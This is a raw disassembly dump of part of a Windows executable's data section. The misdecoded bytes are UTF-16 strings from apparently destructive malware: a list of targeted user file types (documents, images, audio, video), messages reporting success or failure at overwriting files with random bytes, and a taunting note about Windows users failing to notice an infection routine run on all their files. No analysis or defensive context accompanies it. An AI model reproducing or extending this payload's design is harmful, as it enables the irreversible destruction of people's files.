   140004609:	61                   	(bad)
   14000460a:	00 79 00             	add    %bh,0x0(%rcx)
   14000460d:	6c                   	insb   (%dx),(%rdi)
   14000460e:	00 6f 00             	add    %ch,0x0(%rdi)
   140004611:	61                   	(bad)
   140004612:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004616:	00 77 00             	add    %dh,0x0(%rdi)
   140004619:	69 00 74 00 68 00    	imul   $0x680074,(%rax),%eax
   14000461f:	6f                   	outsl  (%rsi),(%dx)
   140004620:	00 75 00             	add    %dh,0x0(%rbp)
   140004623:	74 00                	je     0x140004625
   140004625:	20 00                	and    %al,(%rax)
   140004627:	61                   	(bad)
   140004628:	00 64 00 6d          	add    %ah,0x6d(%rax,%rax,1)
   14000462c:	00 69 00             	add    %ch,0x0(%rcx)
   14000462f:	6e                   	outsb  (%rsi),(%dx)
   140004630:	00 69 00             	add    %ch,0x0(%rcx)
   140004633:	73 00                	jae    0x140004635
   140004635:	74 00                	je     0x140004637
   140004637:	72 00                	jb     0x140004639
   140004639:	61                   	(bad)
   14000463a:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   14000463e:	00 72 00             	add    %dh,0x0(%rdx)
   140004641:	20 00                	and    %al,(%rax)
   140004643:	61                   	(bad)
   140004644:	00 63 00             	add    %ah,0x0(%rbx)
   140004647:	63 00                	movsxd (%rax),%eax
   140004649:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   14000464d:	73 00                	jae    0x14000464f
   14000464f:	2e 00 00             	cs add %al,(%rax)
   140004652:	0b 2a                	or     (%rdx),%ebp
   140004654:	00 2e                	add    %ch,(%rsi)
   140004656:	00 64 00 6c          	add    %ah,0x6c(%rax,%rax,1)
   14000465a:	00 6c 00 00          	add    %ch,0x0(%rax,%rax,1)
   14000465e:	0b 2a                	or     (%rdx),%ebp
   140004660:	00 2e                	add    %ch,(%rsi)
   140004662:	00 70 00             	add    %dh,0x0(%rax)
   140004665:	64 00 66 00          	add    %ah,%fs:0x0(%rsi)
   140004669:	00 0b                	add    %cl,(%rbx)
   14000466b:	2a 00                	sub    (%rax),%al
   14000466d:	2e 00 64 00 6f       	cs add %ah,0x6f(%rax,%rax,1)
   140004672:	00 63 00             	add    %ah,0x0(%rbx)
   140004675:	00 0d 2a 00 2e 00    	add    %cl,0x2e002a(%rip)        # 0x1402e46a5
   14000467b:	64 00 6f 00          	add    %ch,%fs:0x0(%rdi)
   14000467f:	63 00                	movsxd (%rax),%eax
   140004681:	78 00                	js     0x140004683
   140004683:	00 0b                	add    %cl,(%rbx)
   140004685:	2a 00                	sub    (%rax),%al
   140004687:	2e 00 74 00 78       	cs add %dh,0x78(%rax,%rax,1)
   14000468c:	00 74 00 00          	add    %dh,0x0(%rax,%rax,1)
   140004690:	0b 2a                	or     (%rdx),%ebp
   140004692:	00 2e                	add    %ch,(%rsi)
   140004694:	00 6a 00             	add    %ch,0x0(%rdx)
   140004697:	70 00                	jo     0x140004699
   140004699:	67 00 00             	add    %al,(%eax)
   14000469c:	0b 2a                	or     (%rdx),%ebp
   14000469e:	00 2e                	add    %ch,(%rsi)
   1400046a0:	00 70 00             	add    %dh,0x0(%rax)
   1400046a3:	6e                   	outsb  (%rsi),(%dx)
   1400046a4:	00 67 00             	add    %ah,0x0(%rdi)
   1400046a7:	00 0b                	add    %cl,(%rbx)
   1400046a9:	2a 00                	sub    (%rax),%al
   1400046ab:	2e 00 6d 00          	cs add %ch,0x0(%rbp)
   1400046af:	70 00                	jo     0x1400046b1
   1400046b1:	33 00                	xor    (%rax),%eax
   1400046b3:	00 0b                	add    %cl,(%rbx)
   1400046b5:	2a 00                	sub    (%rax),%al
   1400046b7:	2e 00 77 00          	cs add %dh,0x0(%rdi)
   1400046bb:	61                   	(bad)
   1400046bc:	00 76 00             	add    %dh,0x0(%rsi)
   1400046bf:	00 0b                	add    %cl,(%rbx)
   1400046c1:	2a 00                	sub    (%rax),%al
   1400046c3:	2e 00 6d 00          	cs add %ch,0x0(%rbp)
   1400046c7:	70 00                	jo     0x1400046c9
   1400046c9:	34 00                	xor    $0x0,%al
   1400046cb:	00 0d 2a 00 2e 00    	add    %cl,0x2e002a(%rip)        # 0x1402e46fb
   1400046d1:	77 00                	ja     0x1400046d3
   1400046d3:	65 00 62 00          	add    %ah,%gs:0x0(%rdx)
   1400046d7:	6d                   	insl   (%dx),(%rdi)
   1400046d8:	00 00                	add    %al,(%rax)
   1400046da:	0b 2a                	or     (%rdx),%ebp
   1400046dc:	00 2e                	add    %ch,(%rsi)
   1400046de:	00 70 00             	add    %dh,0x0(%rax)
   1400046e1:	73 00                	jae    0x1400046e3
   1400046e3:	64 00 00             	add    %al,%fs:(%rax)
   1400046e6:	1f                   	(bad)
   1400046e7:	50                   	push   %rax
   1400046e8:	00 61 00             	add    %ah,0x0(%rcx)
   1400046eb:	79 00                	jns    0x1400046ed
   1400046ed:	6c                   	insb   (%dx),(%rdi)
   1400046ee:	00 6f 00             	add    %ch,0x0(%rdi)
   1400046f1:	61                   	(bad)
   1400046f2:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   1400046f6:	00 53 00             	add    %dl,0x0(%rbx)
   1400046f9:	75 00                	jne    0x1400046fb
   1400046fb:	63 00                	movsxd (%rax),%eax
   1400046fd:	63 00                	movsxd (%rax),%eax
   1400046ff:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004703:	73 00                	jae    0x140004705
   140004705:	00 31                	add    %dh,(%rcx)
   140004707:	53                   	push   %rbx
   140004708:	00 75 00             	add    %dh,0x0(%rbp)
   14000470b:	63 00                	movsxd (%rax),%eax
   14000470d:	63 00                	movsxd (%rax),%eax
   14000470f:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004713:	73 00                	jae    0x140004715
   140004715:	66 00 75 00          	data16 add %dh,0x0(%rbp)
   140004719:	6c                   	insb   (%dx),(%rdi)
   14000471a:	00 6c 00 79          	add    %ch,0x79(%rax,%rax,1)
   14000471e:	00 20                	add    %ah,(%rax)
   140004720:	00 6f 00             	add    %ch,0x0(%rdi)
   140004723:	76 00                	jbe    0x140004725
   140004725:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004729:	77 00                	ja     0x14000472b
   14000472b:	72 00                	jb     0x14000472d
   14000472d:	6f                   	outsl  (%rsi),(%dx)
   14000472e:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004732:	00 20                	add    %ah,(%rax)
   140004734:	00 27                	add    %ah,(%rdi)
   140004736:	00 01                	add    %al,(%rcx)
   140004738:	29 27                	sub    %esp,(%rdi)
   14000473a:	00 20                	add    %ah,(%rax)
   14000473c:	00 77 00             	add    %dh,0x0(%rdi)
   14000473f:	69 00 74 00 68 00    	imul   $0x680074,(%rax),%eax
   140004745:	20 00                	and    %al,(%rax)
   140004747:	72 00                	jb     0x140004749
   140004749:	61                   	(bad)
   14000474a:	00 6e 00             	add    %ch,0x0(%rsi)
   14000474d:	64 00 6f 00          	add    %ch,%fs:0x0(%rdi)
   140004751:	6d                   	insl   (%dx),(%rdi)
   140004752:	00 20                	add    %ah,(%rax)
   140004754:	00 62 00             	add    %ah,0x0(%rdx)
   140004757:	79 00                	jns    0x140004759
   140004759:	74 00                	je     0x14000475b
   14000475b:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   14000475f:	2e 00 01             	cs add %al,(%rcx)
   140004762:	1f                   	(bad)
   140004763:	50                   	push   %rax
   140004764:	00 61 00             	add    %ah,0x0(%rcx)
   140004767:	79 00                	jns    0x140004769
   140004769:	6c                   	insb   (%dx),(%rdi)
   14000476a:	00 6f 00             	add    %ch,0x0(%rdi)
   14000476d:	61                   	(bad)
   14000476e:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004772:	00 46 00             	add    %al,0x0(%rsi)
   140004775:	61                   	(bad)
   140004776:	00 69 00             	add    %ch,0x0(%rcx)
   140004779:	6c                   	insb   (%dx),(%rdi)
   14000477a:	00 75 00             	add    %dh,0x0(%rbp)
   14000477d:	72 00                	jb     0x14000477f
   14000477f:	65 00 00             	add    %al,%gs:(%rax)
   140004782:	33 57 00             	xor    0x0(%rdi),%edx
   140004785:	61                   	(bad)
   140004786:	00 73 00             	add    %dh,0x0(%rbx)
   140004789:	20 00                	and    %al,(%rax)
   14000478b:	75 00                	jne    0x14000478d
   14000478d:	6e                   	outsb  (%rsi),(%dx)
   14000478e:	00 61 00             	add    %ah,0x0(%rcx)
   140004791:	62                   	(bad)
   140004792:	00 6c 00 65          	add    %ch,0x65(%rax,%rax,1)
   140004796:	00 20                	add    %ah,(%rax)
   140004798:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   14000479c:	00 20                	add    %ah,(%rax)
   14000479e:	00 6f 00             	add    %ch,0x0(%rdi)
   1400047a1:	76 00                	jbe    0x1400047a3
   1400047a3:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1400047a7:	77 00                	ja     0x1400047a9
   1400047a9:	72 00                	jb     0x1400047ab
   1400047ab:	69 00 74 00 65 00    	imul   $0x650074,(%rax),%eax
   1400047b1:	20 00                	and    %al,(%rax)
   1400047b3:	27                   	(bad)
   1400047b4:	00 01                	add    %al,(%rcx)
   1400047b6:	85 29                	test   %ebp,(%rcx)
   1400047b8:	59                   	pop    %rcx
   1400047b9:	00 6f 00             	add    %ch,0x0(%rdi)
   1400047bc:	75 00                	jne    0x1400047be
   1400047be:	20 00                	and    %al,(%rax)
   1400047c0:	6b 00 6e             	imul   $0x6e,(%rax),%eax
   1400047c3:	00 6f 00             	add    %ch,0x0(%rdi)
   1400047c6:	77 00                	ja     0x1400047c8
   1400047c8:	20 00                	and    %al,(%rax)
   1400047ca:	77 00                	ja     0x1400047cc
   1400047cc:	68 00 61 00 74       	push   $0x74006100
   1400047d1:	00 27                	add    %ah,(%rdi)
   1400047d3:	00 73 00             	add    %dh,0x0(%rbx)
   1400047d6:	20 00                	and    %al,(%rax)
   1400047d8:	66 00 75 00          	data16 add %dh,0x0(%rbp)
   1400047dc:	6e                   	outsb  (%rsi),(%dx)
   1400047dd:	00 6e 00             	add    %ch,0x0(%rsi)
   1400047e0:	79 00                	jns    0x1400047e2
   1400047e2:	3f                   	(bad)
   1400047e3:	00 20                	add    %ah,(%rax)
   1400047e5:	00 54 00 68          	add    %dl,0x68(%rax,%rax,1)
   1400047e9:	00 65 00             	add    %ah,0x0(%rbp)
   1400047ec:	20 00                	and    %al,(%rax)
   1400047ee:	69 00 6e 00 65 00    	imul   $0x65006e,(%rax),%eax
   1400047f4:	70 00                	jo     0x1400047f6
   1400047f6:	74 00                	je     0x1400047f8
   1400047f8:	69 00 74 00 75 00    	imul   $0x750074,(%rax),%eax
   1400047fe:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   140004802:	20 00                	and    %al,(%rax)
   140004804:	61                   	(bad)
   140004805:	00 6e 00             	add    %ch,0x0(%rsi)
   140004808:	64 00 20             	add    %ah,%fs:(%rax)
   14000480b:	00 69 00             	add    %ch,0x0(%rcx)
   14000480e:	67 00 6e 00          	add    %ch,0x0(%esi)
   140004812:	6f                   	outsl  (%rsi),(%dx)
   140004813:	00 72 00             	add    %dh,0x0(%rdx)
   140004816:	61                   	(bad)
   140004817:	00 6e 00             	add    %ch,0x0(%rsi)
   14000481a:	63 00                	movsxd (%rax),%eax
   14000481c:	65 00 20             	add    %ah,%gs:(%rax)
   14000481f:	00 6f 00             	add    %ch,0x0(%rdi)
   140004822:	66 00 20             	data16 add %ah,(%rax)
   140004825:	00 57 00             	add    %dl,0x0(%rdi)
   140004828:	69 00 6e 00 64 00    	imul   $0x64006e,(%rax),%eax
   14000482e:	6f                   	outsl  (%rsi),(%dx)
   14000482f:	00 77 00             	add    %dh,0x0(%rdi)
   140004832:	73 00                	jae    0x140004834
   140004834:	20 00                	and    %al,(%rax)
   140004836:	75 00                	jne    0x140004838
   140004838:	73 00                	jae    0x14000483a
   14000483a:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000483e:	73 00                	jae    0x140004840
   140004840:	2e 00 20             	cs add %ah,(%rax)
   140004843:	00 46 00             	add    %al,0x0(%rsi)
   140004846:	6f                   	outsl  (%rsi),(%dx)
   140004847:	00 72 00             	add    %dh,0x0(%rdx)
   14000484a:	20 00                	and    %al,(%rax)
   14000484c:	65 00 78 00          	add    %bh,%gs:0x0(%rax)
   140004850:	61                   	(bad)
   140004851:	00 6d 00             	add    %ch,0x0(%rbp)
   140004854:	70 00                	jo     0x140004856
   140004856:	6c                   	insb   (%dx),(%rdi)
   140004857:	00 65 00             	add    %ah,0x0(%rbp)
   14000485a:	2c 00                	sub    $0x0,%al
   14000485c:	20 00                	and    %al,(%rax)
   14000485e:	69 00 66 00 20 00    	imul   $0x200066,(%rax),%eax
   140004864:	79 00                	jns    0x140004866
   140004866:	6f                   	outsl  (%rsi),(%dx)
   140004867:	00 75 00             	add    %dh,0x0(%rbp)
   14000486a:	20 00                	and    %al,(%rax)
   14000486c:	77 00                	ja     0x14000486e
   14000486e:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004872:	65 00 20             	add    %ah,%gs:(%rax)
   140004875:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004879:	00 20                	add    %ah,(%rax)
   14000487b:	00 72 00             	add    %dh,0x0(%rdx)
   14000487e:	75 00                	jne    0x140004880
   140004880:	6e                   	outsb  (%rsi),(%dx)
   140004881:	00 20                	add    %ah,(%rax)
   140004883:	00 61 00             	add    %ah,0x0(%rcx)
   140004886:	20 00                	and    %al,(%rax)
   140004888:	70 00                	jo     0x14000488a
   14000488a:	69 00 65 00 63 00    	imul   $0x630065,(%rax),%eax
   140004890:	65 00 20             	add    %ah,%gs:(%rax)
   140004893:	00 6f 00             	add    %ch,0x0(%rdi)
   140004896:	66 00 20             	data16 add %ah,(%rax)
   140004899:	00 6d 00             	add    %ch,0x0(%rbp)
   14000489c:	61                   	(bad)
   14000489d:	00 6c 00 77          	add    %ch,0x77(%rax,%rax,1)
   1400048a1:	00 61 00             	add    %ah,0x0(%rcx)
   1400048a4:	72 00                	jb     0x1400048a6
   1400048a6:	65 00 2c 00          	add    %ch,%gs:(%rax,%rax,1)
   1400048aa:	20 00                	and    %al,(%rax)
   1400048ac:	61                   	(bad)
   1400048ad:	00 6e 00             	add    %ch,0x0(%rsi)
   1400048b0:	64 00 20             	add    %ah,%fs:(%rax)
   1400048b3:	00 68 00             	add    %ch,0x0(%rax)
   1400048b6:	61                   	(bad)
   1400048b7:	00 76 00             	add    %dh,0x0(%rsi)
   1400048ba:	65 00 20             	add    %ah,%gs:(%rax)
   1400048bd:	00 69 00             	add    %ch,0x0(%rcx)
   1400048c0:	74 00                	je     0x1400048c2
   1400048c2:	20 00                	and    %al,(%rax)
   1400048c4:	72 00                	jb     0x1400048c6
   1400048c6:	75 00                	jne    0x1400048c8
   1400048c8:	6e                   	outsb  (%rsi),(%dx)
   1400048c9:	00 20                	add    %ah,(%rax)
   1400048cb:	00 73 00             	add    %dh,0x0(%rbx)
   1400048ce:	6f                   	outsl  (%rsi),(%dx)
   1400048cf:	00 6d 00             	add    %ch,0x0(%rbp)
   1400048d2:	65 00 20             	add    %ah,%gs:(%rax)
   1400048d5:	00 73 00             	add    %dh,0x0(%rbx)
   1400048d8:	6f                   	outsl  (%rsi),(%dx)
   1400048d9:	00 72 00             	add    %dh,0x0(%rdx)
   1400048dc:	74 00                	je     0x1400048de
   1400048de:	20 00                	and    %al,(%rax)
   1400048e0:	6f                   	outsl  (%rsi),(%dx)
   1400048e1:	00 66 00             	add    %ah,0x0(%rsi)
   1400048e4:	20 00                	and    %al,(%rax)
   1400048e6:	69 00 6e 00 66 00    	imul   $0x66006e,(%rax),%eax
   1400048ec:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   1400048f0:	74 00                	je     0x1400048f2
   1400048f2:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   1400048f8:	20 00                	and    %al,(%rax)
   1400048fa:	72 00                	jb     0x1400048fc
   1400048fc:	6f                   	outsl  (%rsi),(%dx)
   1400048fd:	00 75 00             	add    %dh,0x0(%rbp)
   140004900:	74 00                	je     0x140004902
   140004902:	69 00 6e 00 65 00    	imul   $0x65006e,(%rax),%eax
   140004908:	20 00                	and    %al,(%rax)
   14000490a:	6f                   	outsl  (%rsi),(%dx)
   14000490b:	00 6e 00             	add    %ch,0x0(%rsi)
   14000490e:	20 00                	and    %al,(%rax)
   140004910:	61                   	(bad)
   140004911:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   140004915:	00 20                	add    %ah,(%rax)
   140004917:	00 6f 00             	add    %ch,0x0(%rdi)
   14000491a:	66 00 20             	data16 add %ah,(%rax)
   14000491d:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004921:	00 65 00             	add    %ah,0x0(%rbp)
   140004924:	69 00 72 00 20 00    	imul   $0x200072,(%rax),%eax
   14000492a:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   14000492e:	6c                   	insb   (%dx),(%rdi)
   14000492f:	00 65 00             	add    %ah,0x0(%rbp)
   140004932:	73 00                	jae    0x140004934
   140004934:	2c 00                	sub    $0x0,%al
   140004936:	20 00                	and    %al,(%rax)
   140004938:	77 00                	ja     0x14000493a
   14000493a:	6f                   	outsl  (%rsi),(%dx)
   14000493b:	00 75 00             	add    %dh,0x0(%rbp)
   14000493e:	6c                   	insb   (%dx),(%rdi)
   14000493f:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004943:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004947:	00 65 00             	add    %ah,0x0(%rbp)
   14000494a:	79 00                	jns    0x14000494c
   14000494c:	20 00                	and    %al,(%rax)
   14000494e:	65 00 76 00          	add    %dh,%gs:0x0(%rsi)
   140004952:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004956:	20 00                	and    %al,(%rax)
   140004958:	6e                   	outsb  (%rsi),(%dx)
   140004959:	00 6f 00             	add    %ch,0x0(%rdi)
   14000495c:	74 00                	je     0x14000495e
   14000495e:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   140004964:	3f                   	(bad)
   140004965:	00 20                	add    %ah,(%rax)
   140004967:	00 4d 00             	add    %cl,0x0(%rbp)
   14000496a:	61                   	(bad)
   14000496b:	00 79 00             	add    %bh,0x0(%rcx)
   14000496e:	62                   	(bad)
   14000496f:	00 65 00             	add    %ah,0x0(%rbp)
   140004972:	20 00                	and    %al,(%rax)
   140004974:	74 00                	je     0x140004976
   140004976:	68 00 65 00 69       	push   $0x69006500
   14000497b:	00 72 00             	add    %dh,0x0(%rdx)
   14000497e:	20 00                	and    %al,(%rax)
   140004980:	69 00 63 00 6f 00    	imul   $0x6f0063,(%rax),%eax
   140004986:	6e                   	outsb  (%rsi),(%dx)
   140004987:	00 73 00             	add    %dh,0x0(%rbx)
   14000498a:	20 00                	and    %al,(%rax)
   14000498c:	64 00 69 00          	add    %ch,%fs:0x0(%rcx)
   140004990:	73 00                	jae    0x140004992
   140004992:	61                   	(bad)
   140004993:	00 70 00             	add    %dh,0x0(%rax)
   140004996:	70 00                	jo     0x140004998
   140004998:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   14000499c:	72 00                	jb     0x14000499e
   14000499e:	2c 00                	sub    $0x0,%al
   1400049a0:	20 00                	and    %al,(%rax)
   1400049a2:	6f                   	outsl  (%rsi),(%dx)
   1400049a3:	00 72 00             	add    %dh,0x0(%rdx)
   1400049a6:	20 00                	and    %al,(%rax)
   1400049a8:	74 00                	je     0x1400049aa
   1400049aa:	68 00 65 00 69       	push   $0x69006500
   1400049af:	00 72 00             	add    %dh,0x0(%rdx)
   1400049b2:	20 00                	and    %al,(%rax)
   1400049b4:	70 00                	jo     0x1400049b6
   1400049b6:	72 00                	jb     0x1400049b8
   1400049b8:	6f                   	outsl  (%rsi),(%dx)
   1400049b9:	00 67 00             	add    %ah,0x0(%rdi)
   1400049bc:	72 00                	jb     0x1400049be
   1400049be:	61                   	(bad)
   1400049bf:	00 6d 00             	add    %ch,0x0(%rbp)
   1400049c2:	73 00                	jae    0x1400049c4
   1400049c4:	20 00                	and    %al,(%rax)
   1400049c6:	74 00                	je     0x1400049c8
   1400049c8:	61                   	(bad)
   1400049c9:	00 6b 00             	add    %ch,0x0(%rbx)
   1400049cc:	65 00 20             	add    %ah,%gs:(%rax)
   1400049cf:	00 6c 00 6f          	add    %ch,0x6f(%rax,%rax,1)
   1400049d3:	00 6e 00             	add    %ch,0x0(%rsi)
   1400049d6:	67 00 65 00          	add    %ah,0x0(%ebp)
   1400049da:	72 00                	jb     0x1400049dc
   1400049dc:	20 00                	and    %al,(%rax)
   1400049de:	74 00                	je     0x1400049e0
   1400049e0:	6f                   	outsl  (%rsi),(%dx)
   1400049e1:	00 20                	add    %ah,(%rax)
   1400049e3:	00 72 00             	add    %dh,0x0(%rdx)
   1400049e6:	75 00                	jne    0x1400049e8
   1400049e8:	6e                   	outsb  (%rsi),(%dx)
   1400049e9:	00 20                	add    %ah,(%rax)
   1400049eb:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   1400049ef:	00 61 00             	add    %ah,0x0(%rcx)
   1400049f2:	6e                   	outsb  (%rsi),(%dx)
   1400049f3:	00 20                	add    %ah,(%rax)
   1400049f5:	00 75 00             	add    %dh,0x0(%rbp)
   1400049f8:	73 00                	jae    0x1400049fa
   1400049fa:	75 00                	jne    0x1400049fc
   1400049fc:	61                   	(bad)
   1400049fd:	00 6c 00 2e          	add    %ch,0x2e(%rax,%rax,1)
   140004a01:	00 20                	add    %ah,(%rax)
   140004a03:	00 4d 00             	add    %cl,0x0(%rbp)
   140004a06:	61                   	(bad)
   140004a07:	00 79 00             	add    %bh,0x0(%rcx)
   140004a0a:	62                   	(bad)
   140004a0b:	00 65 00             	add    %ah,0x0(%rbp)
   140004a0e:	20 00                	and    %al,(%rax)
   140004a10:	74 00                	je     0x140004a12
   140004a12:	68 00 65 00 69       	push   $0x69006500
   140004a17:	00 72 00             	add    %dh,0x0(%rdx)
   140004a1a:	20 00                	and    %al,(%rax)
   140004a1c:	70 00                	jo     0x140004a1e
   140004a1e:	72 00                	jb     0x140004a20
   140004a20:	6f                   	outsl  (%rsi),(%dx)
   140004a21:	00 67 00             	add    %ah,0x0(%rdi)
   140004a24:	72 00                	jb     0x140004a26
   140004a26:	61                   	(bad)
   140004a27:	00 6d 00             	add    %ch,0x0(%rbp)
   140004a2a:	73 00                	jae    0x140004a2c
   140004a2c:	20 00                	and    %al,(%rax)
   140004a2e:	64 00 6f 00          	add    %ch,%fs:0x0(%rdi)
   140004a32:	6e                   	outsb  (%rsi),(%dx)
   140004a33:	00 27                	add    %ah,(%rdi)
   140004a35:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004a39:	00 65 00             	add    %ah,0x0(%rbp)
   140004a3c:	76 00                	jbe    0x140004a3e
   140004a3e:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004a42:	20 00                	and    %al,(%rax)
   140004a44:	77 00                	ja     0x140004a46
   140004a46:	6f                   	outsl  (%rsi),(%dx)
   140004a47:	00 72 00             	add    %dh,0x0(%rdx)
   140004a4a:	6b 00 20             	imul   $0x20,(%rax),%eax
   140004a4d:	00 61 00             	add    %ah,0x0(%rcx)
   140004a50:	74 00                	je     0x140004a52
   140004a52:	20 00                	and    %al,(%rax)
   140004a54:	61                   	(bad)
   140004a55:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   140004a59:	00 2e                	add    %ch,(%rsi)
   140004a5b:	00 20                	add    %ah,(%rax)
   140004a5d:	00 57 00             	add    %dl,0x0(%rdi)
   140004a60:	6f                   	outsl  (%rsi),(%dx)
   140004a61:	00 75 00             	add    %dh,0x0(%rbp)
   140004a64:	6c                   	insb   (%dx),(%rdi)
   140004a65:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004a69:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004a6d:	00 65 00             	add    %ah,0x0(%rbp)
   140004a70:	20 00                	and    %al,(%rax)
   140004a72:	57                   	push   %rdi
   140004a73:	00 69 00             	add    %ch,0x0(%rcx)
   140004a76:	6e                   	outsb  (%rsi),(%dx)
   140004a77:	00 64 00 6f          	add    %ah,0x6f(%rax,%rax,1)
   140004a7b:	00 77 00             	add    %dh,0x0(%rdi)
   140004a7e:	73 00                	jae    0x140004a80
   140004a80:	20 00                	and    %al,(%rax)
   140004a82:	75 00                	jne    0x140004a84
   140004a84:	73 00                	jae    0x140004a86
   140004a86:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004a8a:	20 00                	and    %al,(%rax)
   140004a8c:	62                   	(bad)
   140004a8d:	00 65 00             	add    %ah,0x0(%rbp)
   140004a90:	20 00                	and    %al,(%rax)
   140004a92:	61                   	(bad)
   140004a93:	00 62 00             	add    %ah,0x0(%rdx)
   140004a96:	6c                   	insb   (%dx),(%rdi)
   140004a97:	00 65 00             	add    %ah,0x0(%rbp)
   140004a9a:	20 00                	and    %al,(%rax)
   140004a9c:	74 00                	je     0x140004a9e
   140004a9e:	6f                   	outsl  (%rsi),(%dx)
   140004a9f:	00 20                	add    %ah,(%rax)
   140004aa1:	00 64 00 65          	add    %ah,0x65(%rax,%rax,1)
   140004aa5:	00 64 00 75          	add    %ah,0x75(%rax,%rax,1)
   140004aa9:	00 63 00             	add    %ah,0x0(%rbx)
   140004aac:	65 00 20             	add    %ah,%gs:(%rax)
   140004aaf:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004ab3:	00 61 00             	add    %ah,0x0(%rcx)
   140004ab6:	74 00                	je     0x140004ab8
   140004ab8:	20 00                	and    %al,(%rax)
   140004aba:	74 00                	je     0x140004abc
   140004abc:	68 00 65 00 79       	push   $0x79006500
   140004ac1:	00 27                	add    %ah,(%rdi)
   140004ac3:	00 72 00             	add    %dh,0x0(%rdx)
   140004ac6:	65 00 20             	add    %ah,%gs:(%rax)
   140004ac9:	00 69 00             	add    %ch,0x0(%rcx)
   140004acc:	6e                   	outsb  (%rsi),(%dx)
   140004acd:	00 66 00             	add    %ah,0x0(%rsi)
   140004ad0:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140004ad4:	74 00                	je     0x140004ad6
   140004ad6:	65 00 64 00 3f       	add    %ah,%gs:0x3f(%rax,%rax,1)
   140004adb:	00 20                	add    %ah,(%rax)
   140004add:	00 50 00             	add    %dl,0x0(%rax)
   140004ae0:	72 00                	jb     0x140004ae2
   140004ae2:	6f                   	outsl  (%rsi),(%dx)
   140004ae3:	00 62 00             	add    %ah,0x0(%rdx)
   140004ae6:	61                   	(bad)
   140004ae7:	00 62 00             	add    %ah,0x0(%rdx)
   140004aea:	6c                   	insb   (%dx),(%rdi)
   140004aeb:	00 79 00             	add    %bh,0x0(%rcx)
   140004aee:	20 00                	and    %al,(%rax)
   140004af0:	6e                   	outsb  (%rsi),(%dx)
   140004af1:	00 6f 00             	add    %ch,0x0(%rdi)
   140004af4:	74 00                	je     0x140004af6
   140004af6:	2c 00                	sub    $0x0,%al
   140004af8:	20 00                	and    %al,(%rax)
   140004afa:	62                   	(bad)
   140004afb:	00 75 00             	add    %dh,0x0(%rbp)
   140004afe:	74 00                	je     0x140004b00
   140004b00:	20 00                	and    %al,(%rax)
   140004b02:	6d                   	insl   (%dx),(%rdi)
   140004b03:	00 61 00             	add    %ah,0x0(%rcx)
   140004b06:	79 00                	jns    0x140004b08
   140004b08:	62                   	(bad)
   140004b09:	00 65 00             	add    %ah,0x0(%rbp)
   140004b0c:	20 00                	and    %al,(%rax)
   140004b0e:	74 00                	je     0x140004b10
   140004b10:	68 00 65 00 79       	push   $0x79006500
   140004b15:	00 20                	add    %ah,(%rax)
   140004b17:	00 61 00             	add    %ah,0x0(%rcx)
   140004b1a:	72 00                	jb     0x140004b1c
   140004b1c:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004b20:	27                   	(bad)
   140004b21:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004b25:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004b29:	00 65 00             	add    %ah,0x0(%rbp)
   140004b2c:	20 00                	and    %al,(%rax)
   140004b2e:	6f                   	outsl  (%rsi),(%dx)
   140004b2f:	00 6e 00             	add    %ch,0x0(%rsi)
   140004b32:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004b36:	20 00                	and    %al,(%rax)
   140004b38:	61                   	(bad)
   140004b39:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004b3d:	00 66 00             	add    %ah,0x0(%rsi)
   140004b40:	61                   	(bad)
   140004b41:	00 75 00             	add    %dh,0x0(%rbp)
   140004b44:	6c                   	insb   (%dx),(%rdi)
   140004b45:	00 74 00 2e          	add    %dh,0x2e(%rax,%rax,1)
   140004b49:	00 20                	add    %ah,(%rax)
   140004b4b:	00 4d 00             	add    %cl,0x0(%rbp)
   140004b4e:	61                   	(bad)
   140004b4f:	00 79 00             	add    %bh,0x0(%rcx)
   140004b52:	62                   	(bad)
   140004b53:	00 65 00             	add    %ah,0x0(%rbp)
   140004b56:	20 00                	and    %al,(%rax)
   140004b58:	74 00                	je     0x140004b5a
   140004b5a:	68 00 65 00 79       	push   $0x79006500
   140004b5f:	00 20                	add    %ah,(%rax)
   140004b61:	00 64 00 69          	add    %ah,0x69(%rax,%rax,1)
   140004b65:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004b69:	00 6e 00             	add    %ch,0x0(%rsi)
